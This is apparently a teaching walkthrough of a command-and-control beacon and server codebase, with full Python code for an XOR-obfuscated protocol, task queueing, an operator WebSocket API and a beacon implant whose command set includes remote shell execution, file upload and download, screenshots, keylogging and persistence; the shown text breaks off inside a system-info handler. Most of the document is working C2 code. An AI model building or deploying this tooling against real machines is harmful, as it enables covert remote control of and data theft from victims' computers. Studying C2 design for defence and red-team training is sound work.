<!-- © AngelaMos | 2026 | 03-IMPLEMENTATION.md -->

# Implementation Walkthrough

This document walks through every component of the C2 beacon/server codebase, showing the actual code and explaining the reasoning behind each design choice. We will move from the lowest-level primitives (encoding, protocol, models) up through the database, server-side managers, the beacon implant, and finally the React frontend.

Expect about 30-45 minutes of reading. Every code block references its real file path so you can follow along in your editor.

---

## 1. Protocol Layer

The protocol layer defines how bytes move between the beacon and server. There are three files here: encoding (the wire format), protocol (message envelope), and models (the data shapes).

### 1.1 Encoding (`backend/app/core/encoding.py`)

This file handles the XOR + Base64 encoding pipeline that obscures traffic on the wire. The full implementation:

```python
import base64


def xor_bytes(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def encode(payload: str, key: str) -> str:
    raw = payload.encode("utf-8")
    xored = xor_bytes(raw, key.encode("utf-8"))
    return base64.b64encode(xored).decode("ascii")


def decode(encoded: str, key: str) -> str:
    xored = base64.b64decode(encoded)
    raw = xor_bytes(xored, key.encode("utf-8"))
    return raw.decode("utf-8")
```

The `xor_bytes` function is the core primitive. It takes a data buffer and a key buffer, then XORs each byte of data against the corresponding byte of the key. The expression `key[i % len(key)]` is what makes the key repeat. If your key is `"abc"` (3 bytes) and your data is 10 bytes long, the key cycles: `a, b, c, a, b, c, a, b, c, a`. This is called a repeating-key XOR cipher, sometimes called a Vigenere cipher in its byte form.

The `encode` function chains three steps: convert the string to UTF-8 bytes, XOR those bytes with the key, then Base64-encode the result so it can travel safely over WebSocket text frames. Base64 is necessary because the XOR output will contain arbitrary byte values (including nulls, control characters, and invalid UTF-8 sequences) that would break text-based transport.

The `decode` function reverses that pipeline: Base64-decode first, then XOR (which is its own inverse, so the same `xor_bytes` function works for both directions), then decode from UTF-8 back to a string.

Why XOR and not AES? This is an educational project. XOR lets you see the concept of symmetric encryption without pulling in cryptography libraries. In a real implant, you would use AES-GCM or ChaCha20-Poly1305 with proper key exchange. XOR is trivially breakable with known-plaintext attacks, but it serves its teaching purpose.

### 1.2 Message Types (`backend/app/core/protocol.py`)

This file defines the protocol envelope. Every WebSocket message between beacon and server is wrapped in a `Message` containing a type tag and a payload dictionary.

```python
import binascii
import json
from enum import StrEnum
from typing import Any

from pydantic import BaseModel, ValidationError

from app.core.encoding import decode, encode


class MessageType(StrEnum):
    REGISTER = "REGISTER"
    HEARTBEAT = "HEARTBEAT"
    TASK = "TASK"
    RESULT = "RESULT"
    ERROR = "ERROR"


class Message(BaseModel):
    type: MessageType
    payload: dict[str, Any]


def pack(message: Message, key: str) -> str:
    raw_json = message.model_dump_json()
    return encode(raw_json, key)


def unpack(raw: str, key: str) -> Message:
    try:
        decoded_json = decode(raw, key)
        data = json.loads(decoded_json)
        return Message.model_validate(data)
    except (
            json.JSONDecodeError,
            ValidationError,
            UnicodeDecodeError,
            binascii.Error,
    ) as exc:
        raise ValueError(f"Invalid protocol message: {exc}") from exc
```

`MessageType` uses Python 3.11's `StrEnum`, which means each variant is also a plain string. This matters for JSON serialization. When Pydantic serializes a `MessageType.REGISTER`, it produces the string `"REGISTER"` directly, no custom encoder needed.

There are five message types in the protocol:

- **REGISTER**: Beacon sends this first upon connecting. Payload contains host metadata (hostname, OS, username, PID, IP, architecture).
- **HEARTBEAT**: Beacon sends these periodically to prove it is still alive. Payload just contains the beacon ID.
- **TASK**: Server sends this to assign work to a beacon. Payload contains the task ID, command name, and optional arguments.
- **RESULT**: Beacon sends this after completing a task. Payload contains the task ID plus output/error strings.
- **ERROR**: Reserved for protocol-level errors.

The `Message` model uses `dict[str, Any]` for the payload rather than a typed union. This keeps the protocol layer flexible. The actual payload validation happens at the point of consumption (for example, `BeaconMeta.model_validate(message.payload)` in the beacon router).

`pack` serializes a `Message` to JSON using Pydantic's `model_dump_json()`, then runs it through the XOR+Base64 encoder. `unpack` does the reverse, and wraps four possible failure modes into a single `ValueError`. This is important because a corrupted or tampered message could fail at any of these stages: the Base64 might be invalid (`binascii.Error`), the XOR result might not be valid UTF-8 (`UnicodeDecodeError`), the UTF-8 might not be valid JSON (`json.JSONDecodeError`), or the JSON might not match the `Message` schema (`ValidationError`). Catching all four and re-raising as `ValueError` gives the caller a single exception type to handle.

### 1.3 Data Models (`backend/app/core/models.py`)

This file defines the Pydantic models that represent the core domain objects.

```python
from datetime import UTC, datetime
from enum import StrEnum

from pydantic import BaseModel, Field


class CommandType(StrEnum):
    SHELL = "shell"
    SYSINFO = "sysinfo"
    PROCLIST = "proclist"
    UPLOAD = "upload"
    DOWNLOAD = "download"
    SCREENSHOT = "screenshot"
    KEYLOG_START = "keylog_start"
    KEYLOG_STOP = "keylog_stop"
    PERSIST = "persist"
    SLEEP = "sleep"


class BeaconMeta(BaseModel):
    hostname: str
    os: str
    username: str
    pid: int
    internal_ip: str
    arch: str


class BeaconRecord(BeaconMeta):
    id: str
    first_seen: str
    last_seen: str


class TaskRequest(BaseModel):
    beacon_id: str
    command: CommandType
    args: str | None = None


class TaskRecord(BaseModel):
    id: str
    beacon_id: str
    command: CommandType
    args: str | None = None
    status: str = "pending"
    created_at: str = Field(default_factory = lambda: datetime.now(UTC).isoformat())
    completed_at: str | None = None


class TaskResult(BaseModel):
    id: str
    task_id: str
    output: str | None = None
    error: str | None = None
    created_at: str = Field(default_factory = lambda: datetime.now(UTC).isoformat())
```

`CommandType` enumerates every command the beacon understands. These map 1:1 to the `COMMAND_HANDLERS` dictionary in the beacon implant (we will see that later). Each value is lowercase because that is what operators type in the terminal UI.

`BeaconMeta` is the metadata a beacon sends during registration. `BeaconRecord` extends it with server-assigned fields: the unique `id`, `first_seen`, and `last_seen` timestamps. The inheritance means `BeaconRecord` has all six metadata fields plus the three tracking fields.

Why use Pydantic for these models? Three reasons. First, validation. When we call `BeaconMeta.model_validate(message.payload)`, Pydantic checks that every required field exists and has the right type. If someone sends a REGISTER message with `pid: "not_a_number"`, Pydantic raises a `ValidationError` instead of letting garbage propagate through the system. Second, serialization. `model_dump()` and `model_dump_json()` give us clean dictionary and JSON representations without writing custom serializers. Third, IDE support. Type checkers understand Pydantic models, so you get autocomplete and type errors at development time.

`TaskRecord` uses `Field(default_factory=...)` for `created_at`. This ensures each task gets its own timestamp at the moment of creation, rather than reusing a timestamp from when the class was defined. A common mistake is writing `created_at: str = datetime.now(UTC).isoformat()` without `Field`, which would evaluate `datetime.now()` once at import time and stamp every task with the same time.

---

## 2. Database Layer (`backend/app/database.py`)

```python
from collections.abc import AsyncIterator
from contextlib import asynccontextmanager

import aiosqlite

from app.config import settings

SCHEMA = """
CREATE TABLE IF NOT EXISTS beacons (
    id          TEXT PRIMARY KEY,
    hostname    TEXT NOT NULL,
    os          TEXT NOT NULL,
    username    TEXT NOT NULL,
    pid         INTEGER NOT NULL,
    internal_ip TEXT NOT NULL,
    arch        TEXT NOT NULL,
    first_seen  TEXT NOT NULL,
    last_seen   TEXT NOT NULL
);

CREATE TABLE IF NOT EXISTS tasks (
    id           TEXT PRIMARY KEY,
    beacon_id    TEXT NOT NULL,
    command      TEXT NOT NULL,
    args         TEXT,
    status       TEXT NOT NULL DEFAULT 'pending',
    created_at   TEXT NOT NULL,
    completed_at TEXT,
    FOREIGN KEY (beacon_id) REFERENCES beacons(id)
);

CREATE TABLE IF NOT EXISTS task_results (
    id         TEXT PRIMARY KEY,
    task_id    TEXT NOT NULL UNIQUE,
    output     TEXT,
    error      TEXT,
    created_at TEXT NOT NULL,
    FOREIGN KEY (task_id) REFERENCES tasks(id)
);
"""


async def init_db() -> None:
    settings.DATABASE_PATH.parent.mkdir(parents = True, exist_ok = True)
    async with aiosqlite.connect(settings.DATABASE_PATH) as db:
        await db.executescript(SCHEMA)
        await db.execute("PRAGMA journal_mode=WAL")
        await db.execute("PRAGMA foreign_keys=ON")
        await db.commit()


@asynccontextmanager
async def get_db() -> AsyncIterator[aiosqlite.Connection]:
    db = await aiosqlite.connect(settings.DATABASE_PATH)
    db.row_factory = aiosqlite.Row
    await db.execute("PRAGMA foreign_keys=ON")
    try:
        yield db
    finally:
        await db.close()
```

The schema has three tables. The `beacons` table stores one row per beacon that has ever registered. The `tasks` table stores every task ever submitted by an operator, linked to a beacon via `beacon_id`. The `task_results` table stores the output of completed tasks, linked to a task via `task_id`. Notice that `task_id` in `task_results` has a `UNIQUE` constraint. Each task produces at most one result.

`init_db()` is called once at application startup inside the FastAPI lifespan handler. It ensures the data directory exists (`mkdir(parents=True, exist_ok=True)`), creates tables if they do not exist, and sets two SQLite pragmas.

**WAL mode** (`journal_mode=WAL`) stands for Write-Ahead Logging. By default, SQLite uses rollback journals, which lock the entire database during writes. WAL allows concurrent reads while a write is in progress. Since we have multiple async coroutines reading beacon state while tasks are being written, WAL prevents those reads from blocking.

**Foreign keys** (`foreign_keys=ON`) must be explicitly enabled in SQLite. Without it, you could insert a task referencing a beacon_id that does not exist. SQLite's foreign key support is there but disabled by default for backwards compatibility. We enable it in both `init_db` and `get_db` because the pragma is per-connection, not per-database.

The `get_db()` context manager creates a fresh connection for each use and closes it when done. The critical line is `db.row_factory = aiosqlite.Row`. Without this, queries return plain tuples. With it, rows behave like dictionaries. You can access columns by name (`row["hostname"]`) and convert to a real dict with `dict(row)`. This is what allows the pattern `BeaconRecord(**dict(row))` in the registry. If you forget to set `row_factory`, you get tuples, and `**dict(row)` will fail because tuples are not mappings.

---

## 3. Beacon Registry (`backend/app/beacon/registry.py`)

The registry tracks beacon connections using a dual-layer approach: an in-memory dictionary for active WebSocket connections and SQLite for persistent records.

```python
from datetime import UTC, datetime

import aiosqlite
from fastapi import WebSocket

from app.core.models import BeaconMeta, BeaconRecord


class BeaconRegistry:
    def __init__(self) -> None:
        self._connections: dict[str, WebSocket] = {}

    async def register(
        self,
        beacon_id: str,
        meta: BeaconMeta,
        ws: WebSocket,
        db: aiosqlite.Connection,
    ) -> None:
        self._connections[beacon_id] = ws
        now = datetime.now(UTC).isoformat()

        await db.execute(
            """
            INSERT INTO beacons (id, hostname, os, username, pid, internal_ip, arch, first_seen, last_seen)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ON CONFLICT(id) DO UPDATE SET
                hostname = excluded.hostname,
                os = excluded.os,
                username = excluded.username,
                pid = excluded.pid,
                internal_ip = excluded.internal_ip,
                arch = excluded.arch,
                last_seen = excluded.last_seen
            """,
            (
                beacon_id,
                meta.hostname,
                meta.os,
                meta.username,
                meta.pid,
                meta.internal_ip,
                meta.arch,
                now,
                now,
            ),
        )
        await db.commit()

    async def unregister(
        self,
        beacon_id: str,
        db: aiosqlite.Connection,
    ) -> None:
        self._connections.pop(beacon_id, None)
        now = datetime.now(UTC).isoformat()
        await db.execute(
            "UPDATE beacons SET last_seen = ? WHERE id = ?",
            (now, beacon_id),
        )
        await db.commit()

    def is_active(self, beacon_id: str) -> bool:
        return beacon_id in self._connections

    def list_active_ids(self) -> list[str]:
        return list(self._connections.keys())

    async def get_all(self, db: aiosqlite.Connection) -> list[BeaconRecord]:
        cursor = await db.execute("SELECT * FROM beacons ORDER BY last_seen DESC")
        rows = await cursor.fetchall()
        return [BeaconRecord(**dict(row)) for row in rows]

    async def update_last_seen(
        self,
        beacon_id: str,
        db: aiosqlite.Connection,
    ) -> None:
        now = datetime.now(UTC).isoformat()
        await db.execute(
            "UPDATE beacons SET last_seen = ? WHERE id = ?",
            (now, beacon_id),
        )
        await db.commit()
```

The `_connections` dict maps beacon IDs to their WebSocket objects. This is the "hot" path for checking if a beacon is currently online. When the dashboard asks "is beacon X active?", we check `beacon_id in self._connections`. This is O(1) and does not touch the database.

The `register` method does two things: stores the WebSocket reference in memory and upserts the beacon record in SQLite. The SQL uses `INSERT ... ON CONFLICT(id) DO UPDATE`, which means: if this beacon ID has never been seen before, insert a new row with both `first_seen` and `last_seen` set to now. If the beacon has connected before (same UUID), update all the metadata fields and refresh `last_seen`, but leave `first_seen` alone. The `excluded` keyword in SQLite refers to the row that would have been inserted. This handles the scenario where a beacon reconnects after a crash. Its hostname, PID, or IP might have changed, so we update those, but we preserve the original `first_seen` timestamp.

The `unregister` method removes the WebSocket from the in-memory dict using `pop(beacon_id, None)`. The `None` default means it does not raise `KeyError` if the beacon was already removed. It also stamps the final `last_seen` in the database so the dashboard can show when the beacon was last alive.

`get_all` fetches every beacon record from the database, ordered by most recently seen. This is used when a new operator connects and needs the full beacon inventory. The pattern `[BeaconRecord(**dict(row)) for row in rows]` converts each `aiosqlite.Row` into a dict, then unpacks it into a Pydantic model. This gives us validated, typed objects rather than raw dicts.

---

## 4. Task Manager (`backend/app/beacon/tasking.py`)

The task manager is the core of the C2 tasking pipeline. It combines SQLite persistence with per-beacon `asyncio.Queue` instances for real-time task delivery.

```python
import asyncio

import aiosqlite

from app.core.models import TaskRecord, TaskResult


class TaskManager:
    def __init__(self) -> None:
        self._queues: dict[str, asyncio.Queue[TaskRecord]] = {}

    def _ensure_queue(self, beacon_id: str) -> asyncio.Queue[TaskRecord]:
        if beacon_id not in self._queues:
            self._queues[beacon_id] = asyncio.Queue()
        return self._queues[beacon_id]

    async def submit(
        self,
        task: TaskRecord,
        db: aiosqlite.Connection,
    ) -> None:
        await db.execute(
            """
            INSERT INTO tasks (id, beacon_id, command, args, status, created_at)
            VALUES (?, ?, ?, ?, ?, ?)
            """,
            (
                task.id,
                task.beacon_id,
                task.command,
                task.args,
                task.status,
                task.created_at,
            ),
        )
        await db.commit()

        queue = self._ensure_queue(task.beacon_id)
        await queue.put(task)

    async def get_next(self, beacon_id: str) -> TaskRecord:
        queue = self._ensure_queue(beacon_id)
        return await queue.get()

    async def store_result(
        self,
        result: TaskResult,
        db: aiosqlite.Connection,
    ) -> None:
        await db.execute(
            """
            INSERT INTO task_results (id, task_id, output, error, created_at)
            VALUES (?, ?, ?, ?, ?)
            """,
            (
                result.id,
                result.task_id,
                result.output,
                result.error,
                result.created_at,
            ),
        )
        await db.execute(
            "UPDATE tasks SET status = 'completed', completed_at = ? WHERE id = ?",
            (result.created_at, result.task_id),
        )
        await db.commit()

    async def get_history(
        self,
        beacon_id: str,
        db: aiosqlite.Connection,
    ) -> list[dict[str, str | None]]:
        cursor = await db.execute(
            """
            SELECT
                t.id, t.command, t.args, t.status, t.created_at, t.completed_at,
                tr.output, tr.error
            FROM tasks t
            LEFT JOIN task_results tr ON t.id = tr.task_id
            WHERE t.beacon_id = ?
            ORDER BY t.created_at DESC
            """,
            (beacon_id,),
        )
        rows = await cursor.fetchall()
        return [dict(row) for row in rows]

    def remove_queue(self, beacon_id: str) -> None:
        self._queues.pop(beacon_id, None)
```

The `_queues` dict maps each beacon ID to an `asyncio.Queue[TaskRecord]`. This is the mechanism that bridges the operator side (submitting tasks via WebSocket) to the beacon side (consuming tasks via WebSocket). Each beacon gets its own queue so tasks are delivered only to the intended target.

The `submit` method does two things in sequence. First, it persists the task to SQLite. This ensures the task survives server restarts. Second, it puts the task into the in-memory queue. The beacon's send loop (which we will see in the next section) is blocked on `queue.get()`, so this `put` immediately wakes it up and delivers the task.

`get_next` is the other side. It calls `await queue.get()`, which blocks the calling coroutine until a task is available. This is an elegant use of asyncio. Rather than polling the database on a timer ("are there new tasks for me?"), the beacon's send coroutine just awaits this method and gets unblocked the instant a task is submitted. Zero latency, zero CPU waste.

`store_result` handles the result coming back from the beacon. It inserts a row into `task_results` and updates the corresponding task's status from `"pending"` to `"completed"`. Both operations happen in a single commit, so they are atomic. If the server crashes between the insert and the update, neither takes effect.

`get_history` uses a LEFT JOIN to return tasks alongside their results. The LEFT JOIN matters because pending tasks do not have a result row yet. An INNER JOIN would hide them. The query returns everything ordered by creation time, descending, so the most recent task appears first.

`remove_queue` cleans up when a beacon disconnects. If a beacon drops and reconnects later, `_ensure_queue` will create a fresh queue. Any tasks that were sitting in the old queue are lost from memory, but they still exist in SQLite with status `"pending"`, so they could be re-queued if needed.

---

## 5. Beacon WebSocket Handler (`backend/app/beacon/router.py`)

This is the most important backend file. It implements the WebSocket endpoint that beacons connect to and manages the full lifecycle: handshake, concurrent sending/receiving, and cleanup.

```python
import asyncio
import logging
import uuid

from fastapi import APIRouter, WebSocket, WebSocketDisconnect

from app.beacon.registry import BeaconRegistry
from app.beacon.tasking import TaskManager
from app.config import settings
from app.core.models import BeaconMeta, TaskResult
from app.core.protocol import Message, MessageType, pack, unpack
from app.database import get_db

logger = logging.getLogger(__name__)

router = APIRouter()


async def _send_tasks(
    ws: WebSocket,
    beacon_id: str,
    task_manager: TaskManager,
) -> None:
    while True:
        task = await task_manager.get_next(beacon_id)
        message = Message(
            type = MessageType.TASK,
            payload = {
                "id": task.id,
                "command": task.command,
                "args": task.args,
            },
        )
        await ws.send_text(pack(message, settings.XOR_KEY))


async def _receive_messages(
    ws: WebSocket,
    beacon_id: str,
    registry: BeaconRegistry,
    task_manager: TaskManager,
    ops_broadcast: object,
) -> None:
    while True:
        raw = await ws.receive_text()
        message = unpack(raw, settings.XOR_KEY)

        if message.type == MessageType.RESULT:
            result = TaskResult(
                id = str(uuid.uuid4()),
                task_id = message.payload["task_id"],
                output = message.payload.get("output"),
                error = message.payload.get("error"),
            )
            async with get_db() as db:
                await task_manager.store_result(result, db)

            if hasattr(ops_broadcast, "broadcast"):
                await ops_broadcast.broadcast(
                    {
                        "type": "task_result",
                        "payload": result.model_dump(),
                    }
                )

        elif message.type == MessageType.HEARTBEAT:
            async with get_db() as db:
                await registry.update_last_seen(beacon_id, db)

            if hasattr(ops_broadcast, "broadcast"):
                await ops_broadcast.broadcast(
                    {
                        "type": "heartbeat",
                        "payload": {"id": beacon_id},
                    }
                )
```

Two coroutines handle the two directions of communication. `_send_tasks` sits in a loop calling `task_manager.get_next(beacon_id)`, which blocks until a task is available, then packs it into a protocol message and sends it over the WebSocket. `_receive_messages` sits in a loop reading messages from the beacon. When it receives a RESULT, it persists it and broadcasts to operators. When it receives a HEARTBEAT, it updates the `last_seen` timestamp.

The `hasattr(ops_broadcast, "broadcast")` check is a duck-typing guard. The `ops_broadcast` parameter is typed as `object` because the beacon router does not directly import `OpsManager`. This decoupling means the beacon handler could work without an ops manager at all.

Now the main endpoint that ties everything together:

```python
@router.websocket("/beacon")
async def beacon_websocket(ws: WebSocket) -> None:
    await ws.accept()

    registry: BeaconRegistry = ws.app.state.registry
    task_manager: TaskManager = ws.app.state.task_manager
    ops_manager = ws.app.state.ops_manager
    beacon_id: str | None = None

    try:
        raw = await ws.receive_text()
        message = unpack(raw, settings.XOR_KEY)

        if message.type != MessageType.REGISTER:
            await ws.close(code = 4001, reason = "Expected REGISTER message")
            return

        meta = BeaconMeta.model_validate(message.payload)
        beacon_id = message.payload.get("id", str(uuid.uuid4()))

        async with get_db() as db:
            await registry.register(beacon_id, meta, ws, db)

        logger.info("Beacon registered: %s (%s)", beacon_id, meta.hostname)

        if hasattr(ops_manager, "broadcast"):
            beacon_record = meta.model_dump()
            beacon_record["id"] = beacon_id
            await ops_manager.broadcast(
                {
                    "type": "beacon_connected",
                    "payload": beacon_record,
                }
            )

        send_task = asyncio.create_task(_send_tasks(ws, beacon_id, task_manager))
        recv_task = asyncio.create_task(
            _receive_messages(ws, beacon_id, registry, task_manager, ops_manager)
        )

        done, pending = await asyncio.wait(
            [send_task, recv_task],
            return_when=asyncio.FIRST_COMPLETED,
        )

        for task in pending:
            task.cancel()

        for task in done:
            if (exc := task.exception()) is not None:
                raise exc

    except WebSocketDisconnect:
        logger.info("Beacon disconnected: %s", beacon_id)
    except ValueError as exc:
        logger.warning("Protocol error from beacon %s: %s", beacon_id, exc)
    finally:
        if beacon_id:
            async with get_db() as db:
                await registry.unregister(beacon_id, db)
            task_manager.remove_queue(beacon_id)

            if hasattr(ops_manager, "broadcast"):
                await ops_manager.broadcast(
                    {
                        "type": "beacon_disconnected",
                        "payload": {"id": beacon_id},
                    }
                )
```

Here is the lifecycle, step by step:

**Step 1: Accept the WebSocket.** `await ws.accept()` completes the HTTP upgrade handshake.

**Step 2: Require REGISTER as the first message.** The very first thing we read must be a REGISTER message. If it is anything else, we close the connection with code 4001 (a custom close code in the 4000-4999 range reserved for applications). This is the protocol handshake. No other interaction is allowed until the beacon identifies itself.

**Step 3: Validate and register.** `BeaconMeta.model_validate(message.payload)` ensures the payload has all required fields with correct types. The beacon_id comes from the payload if the beacon provides one (which it does), or we generate a UUID as fallback. The registry stores both the WebSocket reference and the database record.

**Step 4: Broadcast to operators.** All connected operator dashboards receive a `beacon_connected` event so they can update their beacon table in real time.

**Step 5: Launch the dual coroutine pattern.** This is the most important design decision in the file. We create two concurrent tasks: one for sending tasks to the beacon and one for receiving messages from it. Then we await them with `asyncio.wait(..., return_when=FIRST_COMPLETED)`. This means: run both coroutines simultaneously, and when either one finishes (due to disconnection, error, or anything else), come back to the main handler. We then cancel whichever coroutine is still running. This pattern is essential because WebSocket communication is inherently bidirectional. If we used a single loop that alternated between reading and writing, we could not send a task until the beacon happened to send us something, and vice versa.

**Step 6: Cleanup in `finally`.** Regardless of whether the connection ended cleanly (WebSocketDisconnect) or due to a protocol error (ValueError), the `finally` block ensures we unregister the beacon, remove its task queue, and notify operators that it disconnected. This guarantees no resource leaks.

The `for task in done` loop re-raises any exceptions from the completed task. If `_receive_messages` raised a `ValueError` (bad protocol message), that exception propagates up and gets caught by `except ValueError`. If `_send_tasks` encountered a broken pipe, it would raise an exception too.

---

## 6. Operator API (`backend/app/ops/router.py` + `backend/app/ops/manager.py`)

The operator side has two files: a manager that tracks WebSocket connections, and a router that handles both WebSocket and REST endpoints.

### 6.1 OpsManager (`backend/app/ops/manager.py`)

```python
import json
import logging
from typing import Any

from fastapi import WebSocket

logger = logging.getLogger(__name__)


class OpsManager:
    def __init__(self) -> None:
        self._connections: set[WebSocket] = set()

    async def connect(self, ws: WebSocket) -> None:
        await ws.accept()
        self._connections.add(ws)
        logger.info("Operator connected (%d total)", len(self._connections))

    def disconnect(self, ws: WebSocket) -> None:
        self._connections.discard(ws)
        logger.info("Operator disconnected (%d remaining)", len(self._connections))

    async def broadcast(self, event: dict[str, Any]) -> None:
        stale: list[WebSocket] = []
        payload = json.dumps(event)

        for ws in self._connections:
            try:
                await ws.send_text(payload)
            except (ConnectionError, RuntimeError):
                stale.append(ws)

        for ws in stale:
            self._connections.discard(ws)

    @property
    def connection_count(self) -> int:
        return len(self._connections)
```

`OpsManager` uses a `set` rather than a `dict` because operator connections do not have IDs. Any browser tab can be an operator. Multiple tabs can connect simultaneously.

The `broadcast` method sends an event to every connected operator. The interesting part is stale connection handling. If `ws.send_text()` raises `ConnectionError` or `RuntimeError`, we know that WebSocket is dead. Rather than crashing the broadcast, we collect stale connections in a list and remove them after the iteration. We do not modify the set during iteration because that would raise `RuntimeError: Set changed size during iteration`.

`disconnect` uses `discard` instead of `remove`. The difference: `remove` raises `KeyError` if the element is not in the set, while `discard` does nothing. This matters because the broadcast method might have already removed a stale connection before `disconnect` is called from the `finally` block.

### 6.2 Operator Router (`backend/app/ops/router.py`)

```python
import json
import logging
import uuid
from typing import Any

from fastapi import APIRouter, HTTPException, Request, WebSocket, WebSocketDisconnect

from app.beacon.registry import BeaconRegistry
from app.beacon.tasking import TaskManager
from app.core.models import CommandType, TaskRecord
from app.database import get_db
from app.ops.manager import OpsManager

logger = logging.getLogger(__name__)

ws_router = APIRouter()
rest_router = APIRouter()


@ws_router.websocket("/operator")
async def operator_websocket(ws: WebSocket) -> None:
    ops_manager: OpsManager = ws.app.state.ops_manager
    registry: BeaconRegistry = ws.app.state.registry
    task_manager: TaskManager = ws.app.state.task_manager

    await ops_manager.connect(ws)

    try:
        async with get_db() as db:
            beacons = await registry.get_all(db)

        beacon_list = []
        for b in beacons:
            record = b.model_dump()
            record["active"] = registry.is_active(b.id)
            beacon_list.append(record)

        await ws.send_text(json.dumps({
            "type": "beacon_list",
            "payload": beacon_list,
        }))

        while True:
            raw = await ws.receive_text()
            data = json.loads(raw)

            if data.get("type") == "submit_task":
                payload = data["payload"]
                task = TaskRecord(
                    id = str(uuid.uuid4()),
                    beacon_id = payload["beacon_id"],
                    command = CommandType(payload["command"]),
                    args = payload.get("args"),
                )

                async with get_db() as db:
                    await task_manager.submit(task, db)

                await ws.send_text(
                    json.dumps(
                        {
                            "type": "task_submitted",
                            "payload": {
                                "local_id": payload.get("local_id"),
                                "task_id": task.id,
                            },
                        }
                    )
                )

    except WebSocketDisconnect:
        pass
    except json.JSONDecodeError:
        logger.warning("Invalid JSON from operator")
    finally:
        ops_manager.disconnect(ws)
```

The operator WebSocket flow works like this:

**On connect**, the server immediately sends a `beacon_list` message containing every known beacon with its `active` status. This initializes the dashboard. The `active` flag comes from `registry.is_active(b.id)`, which checks the in-memory connection dict. A beacon might exist in the database from a previous session but not be currently connected, so `active` would be `false` for that entry.

**During the session**, the operator sends `submit_task` messages. Each contains a `beacon_id`, `command`, optional `args`, and a `local_id`. The server generates a real UUID for the task, submits it to the task manager (which persists and enqueues it), and then sends back a `task_submitted` acknowledgment that maps the `local_id` to the real `task_id`.

This `local_id` to `task_id` mapping is important. The frontend generates the `local_id` before the server has assigned a UUID. When a task result comes back referencing the server's `task_id`, the frontend needs to match it to the correct terminal entry. The `task_submitted` ack provides that link.

The REST endpoints in the same file (`/beacons`, `/beacons/{beacon_id}`, `/beacons/{beacon_id}/tasks`) provide the same data via HTTP for cases where WebSocket is not suitable, such as curl-based debugging or initial page loads.

---

## 7. Beacon Implant (`beacon/beacon.py`)

The beacon is a single Python file that runs on the target machine. It handles connecting to the C2 server, registering itself, executing commands, and reporting results. Let us walk through each section.

### 7.1 Configuration and Encoding

```python
@dataclass
class BeaconConfig:
    server_url: str = os.environ.get("C2_SERVER_URL",
                                     "ws://localhost:8000/ws/beacon")
    xor_key: str = os.environ.get("C2_XOR_KEY",
                                  "c2-beacon-default-key-change-me")
    sleep_interval: float = float(os.environ.get("C2_SLEEP", "3.0"))
    jitter_percent: float = float(os.environ.get("C2_JITTER", "0.3"))
    reconnect_base: float = 2.0
    reconnect_max: float = 300.0
    beacon_id: str = field(default_factory=lambda: str(uuid.uuid4()))
```

Configuration comes from environment variables with sensible defaults. The `beacon_id` is generated once per process lifetime. If the beacon crashes and restarts, it gets a new UUID, but if it just loses the WebSocket connection and reconnects, it keeps the same ID. The `jitter_percent` of 0.3 means sleep intervals vary by plus or minus 30%, which makes the beacon's traffic pattern less predictable.

The beacon includes its own copies of `xor_bytes`, `encode`, `decode`, `pack`, and `unpack`. These are duplicated from the server intentionally. The beacon is designed to be a self-contained single file with no dependency on the server codebase. In a real scenario, you would not want the beacon importing from the server package.

### 7.2 System Info Collection

```python
def collect_system_info() -> dict[str, Any]:
    return {
        "id": config.beacon_id,
        "hostname": socket.gethostname(),
        "os": f"{platform.system()} {platform.release()}",
        "username": os.getenv("USER", os.getenv("USERNAME", "unknown")),
        "pid": os.getpid(),
        "internal_ip": _get_internal_ip(),
        "arch": platform.machine(),
    }


def _get_internal_ip() -> str:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect(("10.255.255.255", 1))
        ip = sock.getsockname()[0]
        sock.close()
        return ip
    except OSError:
        return "127.0.0.1"
```

The `_get_internal_ip` function uses a well-known trick for discovering the machine's primary IP address without sending any network traffic. Here is how it works:

1. Create a UDP socket (SOCK_DGRAM, not TCP).
2. "Connect" it to the IP address `10.255.255.255` on port 1. For UDP, `connect()` does not actually send any packets. It just sets the default destination and, crucially, causes the OS to select the outbound network interface.
3. Call `getsockname()` to read the local address the OS chose for this socket. That address is your primary internal IP.
4. Close the socket.

The address `10.255.255.255` is in the private 10.0.0.0/8 range. We never actually send data to it. The OS routing table selects which interface would be used to reach that address, and that interface's IP is what we want. This works on Linux, macOS, and Windows. The `OSError` fallback handles edge cases like disconnected network adapters.

### 7.3 Command Dispatch

```python
COMMAND_HANDLERS = {
    "shell": handle_shell,
    "sysinfo": handle_sysinfo,
    "proclist": handle_proclist,
    "upload": handle_upload,
    "download": handle_download,
    "screenshot": handle_screenshot,
    "keylog_start": handle_keylog_start,
    "keylog_stop": handle_keylog_stop,
    "persist": handle_persist,
    "sleep": handle_sleep,
}


async def dispatch(command: str, args: str | None) -> dict[str, Any]:
    handler = COMMAND_HANDLERS.get(command)
    if handler is None:
        return {"output": None, "error": f"Unknown command: {command}"}
    return await handler(args)
```

The `COMMAND_HANDLERS` dict maps command name strings to async handler functions. The `dispatch` function looks up the handler and calls it. If the command is unknown, it returns an error result instead of crashing. Every handler follows the same contract: takes `args: str | None`, returns `dict[str, Any]` with `"output"` and `"error"` keys.

Let us look at three representative handlers:

**Shell execution:**

```python
async def handle_shell(args: str | None) -> dict[str, Any]:
    if not args:
        return {"output": None, "error": "No command provided"}

    proc = await asyncio.create_subprocess_shell(
        args,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    stdout, stderr = await proc.communicate()
    return {
        "output": stdout.decode("utf-8", errors="replace"),
        "error": stderr.decode("utf-8", errors="replace") or None,
    }
```

`create_subprocess_shell` runs the command through the system shell (`/bin/sh` on Linux, `cmd.exe` on Windows). The `PIPE` arguments capture stdout and stderr separately. `communicate()` waits for the process to finish and collects all output. The `errors="replace"` parameter in `decode` replaces invalid UTF-8 bytes with the Unicode replacement character instead of crashing, which is important because command output might contain binary data.

**System info collection (detailed):**

```python
async def handle_sysinfo(_args: str | None) -> dict[str, Any]:
    mem = psutil.virtual_memory()
    disk_info = []
    for part in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(part.mountpoint)
            disk_info.append({
                "device": part.device,
                "mountpoint": part.mountpoint,
                "total_gb": round(usage.total / (1024**3), 2),
                "used_percent": usage.percent,
            })
        except PermissionError:
            continue

    net_info = {}
    for iface, addrs in psutil.net_if_addrs().items():
